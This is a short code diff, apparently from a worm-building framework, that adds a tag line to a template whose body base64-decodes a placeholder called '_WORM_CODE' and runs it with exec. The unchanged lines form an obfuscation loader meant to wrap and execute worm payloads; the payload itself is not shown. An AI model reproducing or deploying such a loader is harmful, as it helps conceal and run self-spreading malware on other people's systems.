@@ -2,6 +2,8 @@
 #!types##shadow
 #!info##encode all codes to base64
 #!reqVar##_WORM_CODE##Worm code. Set automatic
+#!TAGS##[PyS]
+
 import base64
 
 exec(base64.b64decode({{_WORM_CODE}}).decode("utf-8"))
